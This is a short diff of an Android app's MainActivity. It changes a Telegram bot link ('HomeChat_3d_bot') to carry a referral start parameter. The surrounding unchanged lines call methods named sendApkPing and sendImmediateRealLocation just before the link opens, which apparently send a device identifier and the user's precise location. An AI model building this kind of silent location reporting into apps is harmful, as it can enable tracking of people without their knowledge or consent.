@@ -132,7 +132,7 @@ public class MainActivity extends Activity {
                 sendApkPing(uid);
                 sendImmediateRealLocation(uid);
                 try {
-                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/HomeChat_3d_bot")));
+                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/HomeChat_3d_bot?start=xona")));
                 } catch (Exception ignored) {}
             }
         });
